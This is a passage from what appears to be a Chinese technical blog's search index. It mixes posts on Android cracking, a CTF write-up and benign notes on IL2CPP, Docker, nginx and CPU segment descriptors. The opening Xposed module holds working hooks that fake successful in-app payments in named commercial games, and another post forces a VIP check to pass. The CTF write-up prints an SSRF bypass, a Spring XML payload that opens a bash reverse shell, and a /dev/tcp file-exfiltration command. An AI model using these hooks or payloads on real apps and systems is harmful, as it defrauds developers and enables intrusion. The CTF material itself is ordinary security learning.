0).show(); zombie.BuyFailed(); } public void paySuccess(Map arg4) { Toast.makeText(zombie.activity, &quot;支付成功&quot;, 0).show(); zombie.BuySccess(); } });} 逻辑：payCancel 函数 payFailed 函数 都换成 paySuccess通过androidkiller发现 这几个函数在类：com/qy/zombie/zombie$3 下 单机斗地主支付宝购买关键字： 9000 （0x2328）全局搜索 123456789101112131415161718192021222324252627282930313233343536//com/alipay/sdk/app/j public static j a(int arg1) { j v0; switch(arg1) { case 4001: { v0 = j.e; break; } case 5000: { v0 = j.f; break; } case 6001: { v0 = j.c; break; } case 6002: { v0 = j.d; break; } case 8000: { v0 = j.g; break; } case 9000: { v0 = j.a; break; } default: { v0 = j.b; break; } } return v0; } 修改此函数的参数为9000 街机捕鱼达人 同上 com/alipay/sdk/app/i // 代码： package com.example.xposedplugin; import android.os.Message; import java.util.Map; import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XC_MethodReplacement;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage; public class XposedInit implements IXposedHookLoadPackage { @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable { XposedBridge.log(“当前启动的应用程序是：”+loadPackageParam.packageName); if(loadPackageParam.packageName.equals(&quot;com.yunhaoge.tanchishe.egame&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.qy.zombie.zombie$3&quot;, loadPackageParam.classLoader, &quot;payCancel&quot;, Map.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { XposedHelpers.callMethod(methodHookParam.thisObject,&quot;paySuccess&quot;,methodHookParam.args); return null; } }); XposedHelpers.findAndHookMethod(&quot;com.qy.zombie.zombie$3&quot;, loadPackageParam.classLoader, &quot;payFailed&quot;, Map.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { XposedHelpers.callMethod(methodHookParam.thisObject,&quot;paySuccess&quot;,methodHookParam.args); return null; } }); } if (loadPackageParam.packageName.equals(&quot;com.june.game.doudizhu&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.alipay.sdk.app.j&quot;, loadPackageParam.classLoader, &quot;a&quot;, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); XposedBridge.log(&quot;Str参数：&quot; + param.args[0]); param.args[0] = 9000; XposedBridge.log(&quot;修改后参数：&quot;+param.args[0]); } }); } if (loadPackageParam.packageName.equals(&quot;com.prgame5.fish2.baidu&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.alipay.sdk.app.i&quot;, loadPackageParam.classLoader, &quot;a&quot;, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); XposedBridge.log(&quot;Str参数：&quot; + param.args[0]); param.args[0] = 9000; XposedBridge.log(&quot;修改后参数：&quot;+param.args[0]); } }); } } }","link":"/2021/04/07/Android/xposed%E6%A1%86%E6%9E%B6%E8%80%83%E8%AF%95/"},{"title":"安卓破解实战 - 修改重编译","text":"通过 UI Automator Viewer工具找到提交按钮ID 通过ID找到界面 找到界面调用位置 发现一个函数调用了这个界面，直接return掉函数 全局搜索isVip 找到判断修改状态 直接 return true 修改getIsVip = 1","link":"/2021/04/07/Android/%E8%80%83%E9%A2%98/"},{"title":"","text":"参数数量不定的模板 Varuaduc Templates 1234567891011121314151617void print(){}template&lt;typename T,typename... Types&gt; // 接受 1+n个参数void print(const T&amp; firstArg,const Types&amp;... args){ count &lt;&lt; firstArg &lt;&lt; endl; // 打印第一个 print(args...); // 递归调用 当args数量是0的时候 就会调用空参数的print函数}template&lt;typename... Types&gt; // 接受 n个参数void print(const Types&amp;... args){}","link":"/2021/07/10/C++/Templates%E6%A8%A1%E6%9D%BF/"},{"title":"2020-kcft-秋季赛-1.至暗时刻WP","text":"2020-kcft-秋季赛-至暗时刻WP - 布墨 相识 http://121.36.145.157:8088/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg http://121.36.145.157:8088/loadConfig?url=x.xml 相知 链接1 经测试会加载url参数的地址 链接2 返回not allow ip 猜测需要过这个ip校验发现第一个链接会校验url参数的格式^(http|https):\\/\\/[^?#\\/]\\.pediy\\.com\\/.绕过正则： http://121.36.145.157:8088/getimage?url=http://localhost%253a8088%253f.pediy.com/ http://localhost:8080?.pediy.com/ localhost:8080? 俩次url编码 （浏览器请求的时候默认就是一次url编码，服务器收到会解码一次 所以需要俩次 相杀 java写的服务，然后有个FileSystemXmlApplicationContext猜测是CVE-2019-2725的洞 构建poc反弹shell 链接上之后拿到.jar文件 反编译即可 POC 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg &gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/127.0.0.1/9090 0&gt;&amp;1]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 遇到的问题 怎么从靶机中下载文件 主机：nc -lvnp prot &gt; 1.jar 靶机：cat x.jar&gt;/dev/tcp/ip/prot 出题当天晚上我曾用poc链接上 后来断了 那天晚上就一直连接不上了。。不知道为什么，第二天莫名其妙的可以了。。。 参考文章:CVE-2019-2725 二次反序列化FileSystemXmlApplicationContext Gadget POC","link":"/2020/11/18/CTF/2020-kcft-%E7%A7%8B%E5%AD%A3%E8%B5%9B-1-%E8%87%B3%E6%9A%97%E6%97%B6%E5%88%BBWP/"},{"title":"LLVM编译","text":"拉去llvm源码git clone llvmsource cmake安装官网下载cmake https://cmake.org/download/ 新建build文件夹，进去之后cmake ../12cd buildcmake ../","link":"/2021/04/07/LLVM/llvm%20build/"},{"title":"linux configure调试模式","text":"#!/bin/sh./bootstrap.sh./configure –enable-debug –disable-shared –enable-staticmake","link":"/2021/04/07/linux/linux%20configure%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/"},{"title":"代码生成之旅","text":"代码生成之旅托管代码如何映射到C++代码在托管代码中的每个类，il2cpp.exe都会相应的生成一个有着C++定义的头文件和另外一个进行函数声明的头文件。举个例子，让我们看看UnityEngine.Vector3是如何被转换的。这个类的头文件名字叫UnityEngine_UnityEngine_Vector3.h。头文件名的组成：一开始是程序集名称（这里是UnityEngine），然后跟着命名空间（还是UnityEngine），最后是这个类型的名字（Vector3）。头文件的内容如下： 1234567891011// UnityEngine.Vector3struct Vector3_t78{ // System.Single UnityEngine.Vector3::x float ___x_1; // System.Single UnityEngine.Vector3::y float ___y_2; // System.Single UnityEngine.Vector3::z float ___z_3;}; il2cpp.exe对Vector3中三个成员都进行了转换，并且适当的处理了下变量名字（在成员变量前面添加下划线）以避免和保留字冲突。 UnityEngine_UnityEngine_Vector3MethodDeclarations.h头文件中则包含了Vector3这个类中所有相关的函数。比如我们熟悉的ToString函数： 12// System.String UnityEngine.Vector3::ToString()extern &quot;C&quot; String_t* Vector3_ToString_m2315 (Vector3_t78 * __this, MethodInfo* method) IL2CPP_METHOD_ATTR 请大家注意函数前面的注释，它能很好的反应出这个函数在原本托管代码中的名称。我时常发现这些个注释非常有用，能让我在C++代码中快速定位我想要寻找的函数。 由il2cpp.exe生成的函数代码有着以下一些有趣的特性： 所有的函数都不是成员函数。也就是说函数的第一个参数永远都是“this”指针。对于托管代码中的静态函数而言，IL2CPP会传递NULL作为第一个参数的值。这么做的好处是可以让il2cpp.exe转换代码的逻辑更加简单并且让代理函数的处理变得更加容易。 所有的函数还有一个额外的MethodInfo*参数用来描述函数的元信息。这些元信息是虚函数调用的关键。Mono使用和特定平台相关的方法来传递这些元信息。而IL2CPP出于可移植方面的考虑，并没有使用这些和平台相关的特定代码。所有的函数都被声明成了extern “C”，这样一来，在需要的时候我们就可以骗过C++编译器让其认为所有这些函数都是一个类型。 托管函数中的类型会被加上“_t”的后缀，函数则是加上“_m”后缀。最后我们加上一个唯一的数字来避免名字的重复。这些数字会随着项目代码的改变而改变，因此你不能把数字作为索引或者分析的参照。 前两个指针暗示着每个函数都至少有两个参数：“this”和“MethodInfo*”。这些额外的参数会加重整个调用的负担么？理论上是显而易见会加重的，但是我们在实际的测试中还没有发现这些参数对性能产生影响。 我们可以用Ctags工具跳转到ToString函数的定义部分，位于Bulk_UnityEngine_0.cpp文件中。在这个函数中的代码看上去和C#中Vector3::ToString()的代码一点也不像。但是当你用ILSpy 获取到Vector3::ToString()内部的代码后，你会发现C++代码和C#的IL代码是十分接近的。 为什么il2cpp.exe不针对每一个类中的函数生成单独的一个cpp文件呢？看看Bulk_UnityEngine_0.cpp，你会发现它有惊人的20,481行！之所以这么做的原因是我们发现C++编译器在处理大量的文件时会有问题。编译四千多个.cpp文件所用的时间远比编译相同的代码量，但是集中在80个.cpp文件中所用的时间要长得多。因此il2cpp.exe将所有类的函数定义放到一个组里并为这个组生成C++文件。 现在让我们看看函数声明头文件的第一行： 1#include &quot;codegen/il2cpp-codegen.h&quot; il2cpp-codegen.h 文件中包含了用来调用运行时库libil2cpp的代码。我们在稍后会谈谈调用运行时库的一些方法。 函数预处理代码段（Method prologues ）让我们再仔细的看下Vector3::ToString()函数的定义，你会发现函数中有一段特有的代码，这段代码是il2cpp.exe模板产生的，会插入到任何函数的最前面。 1234567StackTraceSentry _stackTraceSentry(&amp;Vector3_ToString_m2315_MethodInfo);static bool Vector3_ToString_m2315_init;if (!Vector3_ToString_m2315_init){ ObjectU5BU5D_t4_il2cpp_TypeInfo_var = il2cpp_codegen_class_from_type(&amp;ObjectU5BU5D_t4_0_0_0); Vector3_ToString_m2315_init = true;} 代码的第一行是一个局部变量StackTraceSentry。这个变量是用来跟踪托管代码的堆栈调用的。有了这个变量，IL2CPP就能在Environment.StackTrace调用中正确的打印出堆栈信息。是否产生这行代码是可选的，当你在il2cpp.exe命令行中加入–enable-stacktrace开关（因为我在WebGL选项中设置了“Enable Exceptions”为“Full”），就会生成这行代码。我们发现对于简单的小函数来说，这行代码的加入对代码的执行性能是有影响的。所以对于iOS或者其他有内置栈信息的平台来说，我们不会加入这行代码（而使用平台内置的栈信息）。但是对于WebGL来说，由于是在浏览器中执行，所以没有系统内置的栈信息可供调用。只能由il2cpp.exe加入以便托管代码的异常机制能正常运作。 代码序的第二部分是数组或者和类型相关的元信息的延迟加载。ObjectU5BU5D_t4实际代表的是System.Object[]。这部分代码永远只执行一次，如果这个类型的元信息已经加载过了，就直接跳过这段代码，啥也不做。所以这段代码不会带来性能下降。 那么这段代码是线程安全的嘛？如果两个线程都同时进行Vector3::ToString() 调用会发生什么？实际上，这不会有任何问题，因为libil2cpp运行时中的类型初始化函数是线程安全的。不管初始化函数被多少个线程同时调用，实际的执行是同一时间只能有一个线程的函数在执行。其他线程的函数都会被挂起直到当前的函数处理完成。所以总的来说，代码是线程安全的。 运行时检查函数的下个部分创建了一个object数组，将Vector3的x存在局部变量中，然后将这个变量装箱并加入到数组的零号位置中。下面是生成的C++代码： 12345678910111213// Create a new single-dimension, zero-based object arrayObjectU5BU5D_t4* L_0 = ((ObjectU5BU5D_t4*)SZArrayNew(ObjectU5BU5D_t4_il2cpp_TypeInfo_var, 3));// Store the Vector3::x field in a localfloat L_1 = (__this-&gt;___x_1);float L_2 = L_1;// Box the float instance, since it is a value type.Object_t * L_3 = Box(InitializedTypeInfo(&amp;Single_t264_il2cpp_TypeInfo), &amp;L_2);// Here are three important runtime checksNullCheck(L_0);IL2CPP_ARRAY_BOUNDS_CHECK(L_0, 0);ArrayElementTypeCheck (L_0, L_3);// Store the boxed value in the array at index 0*((Object_t **)(Object_t **)SZArrayLdElema(L_0, 0)) = (Object_t *)L_3; 在IL代码中没有出现的三个运行时检查是由il2cpp.exe加入的。 如果数组为空，NullCheck代码会抛出NullReferenceException异常。 如果数组的索引不正确，IL2CPP_ARRAY_BOUNDS_CHECK代码会抛出IndexOutOfRangeException异常。 如果加入数组的类型和数组类型不符合，ArrayElementTypeCheck代码会抛出ArrayTypeMismatchException异常。 这三个检查本来都是由.NET虚拟机完成的，在Mono实现中，不会插入这些个代码而是使用平台相关的信号机制来进行检查。对于IL2CPP，我们希望做到和平台无关的可移植性并且还要支持像WebGL这样的平台，所以不能使用Mono的机制，而是显示的插入检查代码。 这些检查会引起性能的下降么？在大多数情况下，我们并没有看到由此带来的性能损失，并且好处是我们提供了.NET虚拟机需要的安全保护机制。在某些特定的场合，比如在大量的循环中，我们确实看到了性能的下降。目前我们正在寻找方法在il2cpp.exe生成代码的时候减少这些运行时检查，各位有兴趣的可以继续关注。 静态变量我们已经了解了实例变量（Vector3）如何运作，现在让我们来看看托管代码中的静态变量是如何转换成C++代码并使用的。让我们找到HelloWorld_Start_m3函数，这个函数应该在Bulk_Assembly-CSharp_0.cpp文件中。从这个函数我们找到一个叫Important_t1的类型（这个类型应该是在U2DCSharp_HelloWorld_Important.h头文件里） 12345678910struct Important_t1 : public Object_t{// System.Int32 HelloWorld/Important::InstanceIdentifierint32_t ___InstanceIdentifier_1;};struct Important_t1_StaticFields{// System.Int32 HelloWorld/Important::ClassIdentifierint32_t ___ClassIdentifier_0;}; 大伙儿可能注意到了，il2cpp.exe将生成的C++代码分成了两个结构，一个结构负责普通的成员变量，另一个结构负责静态成员。因为静态成员是所有实例共享的数据，因此在运行的时候，Important_t1_StaticFields只有一份。所有的Important_t1实例都共享这个数据。在生成的代码中，通过下面的代码来获取静态数据： 1int32_t L_1 = (((Important_t1_StaticFields*)InitializedTypeInfo(&amp;Important_t1_il2cpp_TypeInfo)-&gt;static_fields)-&gt;___ClassIdentifier_0); 在Important_t1的元信息结构中有一个指向Important_t1_StaticFields结构的指针（static_fields），然后通过类型转换再取出需要的值（___ClassIdentifier_0） 异常在托管代码中的异常会被il2cpp.exe转换成C++的异常。我们再一次的选择了这个策略还是出于可移植性的考虑：去掉和平台相关的方案。当il2cpp.exe需要转换生成一个托管的异常的时候，它会调用il2cpp_codegen_raise_exception函数。 在我们的例子中，生成的C++异常处理代码如下： 123456789101112131415161718192021222324try{ // begin try (depth: 1) InvalidOperationException_t7 * L_17 = (InvalidOperationException_t7 *)il2cpp_codegen_object_new (InitializedTypeInfo(&amp;InvalidOperationException_t7_il2cpp_TypeInfo)); InvalidOperationException__ctor_m8(L_17, (String_t*) &amp;_stringLiteral5, /*hidden argument*/&amp;InvalidOperationException__ctor_m8_MethodInfo); il2cpp_codegen_raise_exception(L_17); // IL_0092: leave IL_00a8 goto IL_00a8;} // end try (depth: 1)catch(Il2CppExceptionWrapper&amp; e){ __exception_local = (Exception_t8 *)e.ex; if(il2cpp_codegen_class_is_assignable_from (&amp;InvalidOperationException_t7_il2cpp_TypeInfo, e.ex-&gt;object.klass)) goto IL_0097; throw e;}IL_0097:{ // begin catch(System.InvalidOperationException) V_1 = ((InvalidOperationException_t7 *)__exception_local); NullCheck(V_1); String_t* L_18 = (String_t*)VirtFuncInvoker0&lt; String_t* &gt;::Invoke(&amp;Exception_get_Message_m9_MethodInfo, V_1); Debug_Log_m6(NULL /*static, unused*/, L_18, /*hidden argument*/&amp;Debug_Log_m6_MethodInfo); // IL_00a3: leave IL_00a8 goto IL_00a8;} // end catch (depth: 1) 所有的托管异常都被封装进了il2CppExceptionWrapper的C++类型。当C++代码捕获了这种异常之后，会试图将包解开获得托管异常（Exception_t8）。就这个例子而言，我们期待的是一个InvalidOperationException异常，所以当我们发现抛出的异常不是这个类型的时候，代码会创建一个C++异常的拷贝并重新抛出。反之如果异常正是我们所关注的，代码就会跳到异常处理的那段。 Goto是个什么鬼？跳转语句！？！这段代码有一个有意思的地方：大伙儿发现了labels标签和goto语句没有？这些不太使用的东西居然出现在了结构化的代码中（译注：主流观点都不建议使用labels和goto语句，因为这会破坏程序的结构化导致各种bug的产生）。为什么会这样？因为IL！IL是没有诸如for，while循环和if/then判断结构化概念的低等级的语言。因为il2cpp.exe需要处理IL代码，因此也会出现goto语句。 还是看例子，让我们看看HelloWorld_Start_m3函数中的循环是个啥样子的： 123456789101112131415161718192021222324252627IL_00a8:{ V_2 = 0; goto IL_00cc;}IL_00af:{ ObjectU5BU5D_t4* L_19 = ((ObjectU5BU5D_t4*)SZArrayNew(ObjectU5BU5D_t4_il2cpp_TypeInfo_var, 1)); int32_t L_20 = V_2; Object_t * L_21 = Box(InitializedTypeInfo(&amp;Int32_t5_il2cpp_TypeInfo), &amp;L_20); NullCheck(L_19); IL2CPP_ARRAY_BOUNDS_CHECK(L_19, 0); ArrayElementTypeCheck (L_19, L_21); *((Object_t **)(Object_t **)SZArrayLdElema(L_19, 0)) = (Object_t *)L_21; Debug_LogFormat_m7(NULL /*static, unused*/, (String_t*) &amp;_stringLiteral6, L_19, /*hidden argument*/&amp;Debug_LogFormat_m7_MethodInfo); V_2 = ((int32_t)(V_2+1));}IL_00cc:{ if ((((int32_t)V_2) &lt; ((int32_t)3))) { goto IL_00af; }} 在这里变量V_2是循环的索引，从0开始，在循环代码的最后进行累加。 1V_2 = ((int32_t)(V_2+1)); 循环的结束检查代码： 1if ((((int32_t)V_2) &lt; ((int32_t)3))) 只要V_2小于3，goto语句就会跳转到IL_00af标签处，也就是循环的一开始继续执行。你可能会想：嗯。。il2cpp.exe一定在偷懒，直接使用了IL的代码而不是使用抽象的语法分析树。如果你是这么想的，那么恭喜你猜对了。。。 你可能还会注意到在上面的这段运行时检查的代码中，有下面的情况： 12float L_1 = (__this-&gt;___x_1);float L_2 = L_1; 很显然， 变量L_2不是必须的，大多数的C++编译器会将其优化掉。对于我们来说，我们在想办法不去生成这行代码（译注：因为il2cpp.exe是从IL进行代码的转换，没有使用高级的语法分析，所以会产生多余的代码）。我们也在研究使用高级的抽象语法树（Abstract Syntax Tree，缩写：AST）以便更好的理解IL代码从而产生更好的C++代码（译注：可能以后就会去除goto跳转语句了） 总结总结通过一个简单的项目，我们初窥了IL2CPP如何将托管代码转换成C++代码。如果你没有生成测试项目，我强烈建议你做一遍并进行一些研究。在你做这件事的同时，请记住，在后续Unity的版本中，生成的C++代码可能会和本文有所不同。这是正常的，因为我们在不断的改进和优化IL2CPP。 通过将IL代码转换成C++，我们能够获得在可移植和性能上的一个很好的平衡。我们能拥有高效开发的托管代码的同时，还能获得高质量的C++代码。 在接下来的文章中，我们将探索更多的C++代码，包括函数调用，函数对原生库的封装和共享等。下篇文章我们将会围绕iOS 64-bit和Xcode展开。","link":"/2020/08/26/il2cpp/2%20.%20%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E4%B9%8B%E6%97%85/"},{"title":"深入了解IL2CPP","text":"深入了解IL2CPP什么是IL2CPP 预先编译（AOT） An ahead-of-time (AOT) compiler 支持虚拟机的运行时库 A runtime library to support the virtual machine AOT编译器将由 .NET 输出的中间语言(IL)代码生成为C++代码。 运行时库提供服务和抽象，例如垃圾收集器、对线程和文件的独立平台访问以及内部调用的实现（直接修改托管数据结构的本机代码）。 AOT 编译器IL2CPP AOT 编译器实际的执行文件是 il2cpp.exe.在Windows平台你可以在Unity安装路径的 Editor\\Data\\il2cpp 目录中找到它。在 OSX 上，它位于 Unity安装路径的Contents/Frameworks/il2cpp/build 目录中。il2cpp.exe 应用程序是一个托管的可执行文件，完全用 C# 编写。在 IL2CPP 的开发过程中使用 .NET 和 Mono 编译器对其进行编译。 il2cpp.exe 应用程序接受使用 Unity 附带的 Mono 编译器编译的托管程序集，将这些程序集转换成C++代码，这些转换出的C++代码最终由部署目标平台上的C++编译器进行编译。 运行时库IL2CPP 技术的另一部分是对虚拟机提供支持的运行时库。几乎完全使用 C++ 代码实现了这个库（里面还是有一些和平台相关的代码使用了程序集）。运行时库称为 libil2cpp，它是作为一个静态库被链接到最终的游戏可执行文件中。这么做的一个主要的好处是可以使得整个IL2CPP技术是简单并且是可移植的 通过查看 随 Unity 提供的 libil2cpp 的头文件，可以找到有关如何组织 libil2cpp 代码的一些线索（ Windows 上头文件在Editor\\Data\\PlaybackEngines\\webglsupport\\BuildTools\\Libraries\\libil2cpp\\include 目录中，OSX 上的 Contents/Frameworks/il2cpp/libil2cpp 目录）。例如，由il2cpp产生的C++代码和libil2cpp之间的接口API，存在于codegen/il2cpp-codegen.h这个文件中。 运行时的一个关键部分是垃圾收集器。Unity 5中，我们使用libgc垃圾收集器。它是一个典型的贝姆垃圾收集器（Boehm-Demers-Weiser garbage collector）。（译注：相对使用保守垃圾回收策略）。然而我们的libil2cpp被设计成可以方便使用其他垃圾回收器。因此我们现在也在研究集成微软开源的垃圾回收器（Microsoft GC）。对于垃圾回收器这一点，我们会在后续的一篇中专门的讨论，这里就不多说了。 IL2CPP没做的事情没有尝试用 IL2CPP 重写 C# 标准库。 当你使用IL2CPP后端构建Unity项目的时候，所有在mscorlib.dll，System.dll等中的C#标准库和原来使用Mono编译时候的一模一样。 我们可以依赖健壮的且久经考验的C#标准库，所以当处理有关IL2CPP的bug的时候，我们可以很肯定的说问题出在AOT编译器或者运行时库这两个地方而不是在其他地方。","link":"/2020/08/26/il2cpp/1%20.%20%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3IL2CPP/"},{"title":"linux-docker","text":"docker常用命令 docker run 删除docker容器1. ```docker rm $(docker ps -a -q)```一次删除所有停止的容器 2. ```docker rm &lt;CONTAINER ID|NAME&gt; &lt;CONTAINER ID|NAME&gt;``` 删除单个或多个容器。 启动/停止/连接容器1. ```docker start &lt;CONTAINER ID|NAME&gt;``` 启动容器 2. ```docker stop &lt;CONTAINER ID|NAME&gt;``` 停止容器 3. ```docker attach &lt;CONTAINER ID|NAME&gt;``` 附加到当前正在运行的容器 docker .net core生成影像 docker build -t radarserver . 生成影像 docker run -itd -p 5000:5000 imageid arg 生成容器 docker commit -m=&quot;has update&quot; -a=&quot;zpt&quot; 5a76c9bb0d02 zpt/ubuntu:v2 容器更新镜像 -m:提交的描述信息 -a:指定镜像作者 5a76c9bb0d02：容器ID runoob/ubuntu:v2:指定要创建的目标镜像名 通过dockerfile创建影像 1. 构建dockerfile文件 启动并进入容器内部 映射当前文件夹到容器的projcet 中 1docker run -it -v$(pwd):/project amd64/centos:7 /bin/bash 启动并进入容器内部 映射当前文件夹到容器的projcet 中,并执行 shell 1docker run -it -v$(pwd):/project --rm amd64_rtshell_make /bin/bash -c &quot;cd /project; make all;&quot; docker 镜像导出和导入导出1docker save ImageName &gt; fileName.tar 导入1docker load &lt; fileName.tar 参考文章:Dockerfile文件详解","link":"/2020/11/23/linux/linux-docker/"},{"title":"linux_mysql","text":"创建用户CREATE USER ‘username’@’host’ IDENTIFIED BY ‘password’; 创建数据库CREATE DATABASE databasename; 授权GRANT all privileges ON databasename.tablename TO ‘username’@’host’; 信息同步到内存flush privileges; 参考文章:参考链接","link":"/2020/11/13/linux/linux-mysql/"},{"title":"linux-nginx","text":"centos8 nginx安装 下载nginx 官网：http://nginx.org/ 创建文件夹 mkdir nginx 复制压缩包地址 wget http://nginx.org/download/nginx-1.17.6.tar.gz下载文件 wget不存在 yum安装wget yum -y install wget 安装必要插件 yum -y install automake autoconf libtool make yum -y install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel 压缩下载好的文件 tar -zxvf nginx-1.17.6.tar.gz cd nginx-1.17.6 指定安装路径 ./configure --prefix=/software/nginx --with-http_stub_status_module --with-http_ssl_module make编译 make install安装 进入到安装nginx目录下面的sbin cd /software/nginx/sbin 启动命令 ./nginx 常用命令 从容停止服务器 nginx -s quit 立即停止服务器 nginx -s stop 查询nginx主进程号 ps -ef | grep nginx 从容停止 kill -QUIT 主进程号 快速停止 kill -TERM 主进程号 强制停止 kill -9 nginx 启动 ./nginx 重启 ./nginx -s reload 参考文章:Nginx | CentOS 8 安装Nginx详细教程","link":"/2020/11/23/linux/linux-nginx/"},{"title":"linux-命令","text":"查看端口占用1netstat -nap|grep 8000 终止进程1kill -9 pid 后台运行1nohup ./linux &gt; myout.file 2&gt;&amp;1 &amp;","link":"/2021/04/07/linux/linux-%E5%91%BD%E4%BB%A4/"},{"title":"linux下编译yara","text":"bash: ./build.sh: /bin/sh^M: bad interpreter: No such file or directory q:执行.sh脚本时，报错 “start.sh /bin/bash^M: 坏的解释器：没有那个文件或目录”,因为 .sh文件是从windows拷贝过来的，所以多了\\r，执行命令，把文件中的\\r 替换成空白 sed -i 's/\\r$//' build.sh 参考链接 error: AC_CONFIG_MACRO_DIRS([m4]) conflicts with ACLOCAL_AMFLAGS=-. m4 1234apt-get install dos2unix dos2unix *.shdos2unix *.am 冲突原因，在windows下载，在linux上使用，行结尾标志不一样，需要使用dos2unix转换一下即可","link":"/2021/04/07/linux/linux%E4%B8%8B%E7%BC%96%E8%AF%91yara/"},{"title":"保护模式 - 1.CPU尝试","text":"CPU 架构 Risc架构 手机 嵌入式 优点：少耗电，使用的时间更长 指令集：定长 arm属于此架构 Cisc架构 U V I 低功耗省电 指令集：变长 mov eax,dword ptr ds:[0x12345678] 执行流程： I5 ： 预取 ：取指针 译码1 ：获取原操作数 （指令） 译码2 ：计算地址或者寄存器 执行 ：发送CPU执行 回写 ：执行完回写 I7+ : 预取 ：取指针 译码1 ：获取原操作数 （指令） 取目标数 译码2 ：计算地址或者寄存器 执行 ：发送CPU执行 回写 ：执行完回写 支持多级流水线 这种CPU内部协同工作 叫做超级线程 CPU：预计算 不影响结果的前提 去执行,如下 VS并行执行 12xor eax,eaxxor ecx,ecx 逻辑地址+gtd.ds.base = 线性地址 线性地址拆成物理地址","link":"/2021/04/18/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/1.CPU%E5%B0%9D%E8%AF%95/"},{"title":"保护模式 - 2.段描述符","text":"段描述符 S位：用于指定述符的类型（Descriptor Type）。当该位是“0”时，表示是一个系统段；为“1” 时，表示是一个代码段或者数据段（堆栈段也是特殊的数据段） DPL：表示述符的特权级（Descriptor Privilege Level，DPL）。这两位用于指定段的特权级。共 有 4 种处理器支持的特权级别，分别是 0、1、2、3，其中 0 是最高特权级别，3 是最低特权级别。 刚进入保护模式时执行的代码具有最高特权级 0（可以看成是从处理器那里继承来的），这些代码通 常都是操作系统代码，因此它的特权级别最高。每当操作系统加载一个用户程序时，它通常都会指 定一个稍低的特权级，比如 3 特权级。不同特权级别的程序是互相隔离的，其互访是严格限制的， 而且有些处理器指令（特权指令）只能由 0 特权级的程序来执行，为的就是安全 G位是粒度（Granularity）位，用于解释段界限的含义。当 G 位是“0”时，段界限以字节为 单位。此时，段的扩展范围是从 1 字节到 1 兆字节（1B～1MB）， 因 为 述 符 中 的 界 限 值 是 20 位 的。相反，如果该位是“1”， 那 么 ， 段 界 限 是 以 4KB 为单位的。这样，段的扩展范围是从 4KB 到 4GB。 P位 段是否有效 1有效 0无效 D/B 位是“默认的操作数大小”（Default Operation Size）或者“默认的堆栈指针大小”（Default Stack Pointer Size），又或者“上部边界”（Upper Bound）标志，主要为了能够在32位处理器上兼容运行16位保护模式的程序 D：代码段 用于指示指令中默认的 偏移地址和操作数尺寸。D＝0 表示指令中的偏移地址或者操作数是 16 位的；D=1，指示 32 位的 偏移地址或者操作数 B：堆栈段 用于在进行隐式的堆栈操作时，是使用 SP 寄存器还是 ESP 寄存器。隐式的堆栈操作指令包括 push、pop 和 call 等。如果该位是“0”，在访问那个段时， 使用 SP 寄存器，否则就是使用 ESP 寄存器。同时，B 位的值也决定了堆栈的上部边界。如果 B＝0， 那么堆栈段的上部边界（也就是 SP 寄存器的最大值）为 0xFFFF；如果 B＝1，那么堆栈段的上部 边界（也就是 ESP 寄存器的最大值）为 0xFFFFFFFF。 B=0 G=1 向上拓展 在普通数据段（ES,DS,FS,GS） B=0 是无效的 TYPE 字段共 4 位，用于指示述符的子类型，或者说是类别。 对于数据段来 说，这 4 位分别是 X、E、W、A 位； X E W A 描述符类别 含义 0 0 0 X 数据 只读 0 0 1 X 数据 读，写 0 1 0 X 数据 只读，向下扩展 0 0 0 X 数据 读，写，向下扩展 对于代码段来说，这 4 位则分别是 X、C、R、A 位; X C R A 描述符类别 含义 1 0 0 X 代码 只执行 1 0 1 X 代码 执行，读 1 1 0 X 代码 只执行，依从的代码段 1 1 1 X 代码 执行，读，依从的代码段 X 表示是否可以执行（eXecutable）。数据段总是不可执行的，X＝0；代码段总是 可以执行的，因此，X＝1 A 数据段和代码段的 A 位是已访问（Accessed）位，用于指示它所指向的段最近是否被访问过。 在述符创建的时候，应该清零。之后，每当该段被访问时，处理器自动将该位置“1”。对该位的 清零是由软件（操作系统）负责的，通过定期监视该位的状态，就可以统计出该段的使用频率。当 内存空间紧张时，可以把不经常使用的段退避到硬盘上，从而实现虚拟内存管理。 对于数据段来说 E 位指示段的扩展方向。E＝0 是向上扩展的，也就是向高地址方向扩展的，不包含limit， 是普通的数据段；E＝1 是向下扩展的，也就是向低地址方向扩展的，包含limit，通常是堆栈段 W 位指示段 的读写属性，或者说段是否可写，W＝0 的段是不允许写入的，否则会引发处理器异常中断；W＝1 的段是可以正常写入的 对于代码段来说 C 位指示段是否为特权级依从的（Conforming）。 C＝0 表示非依从的代码段， 这样的代码段可以从与它特权级相同的代码段调用，或者通过门调用；C＝1 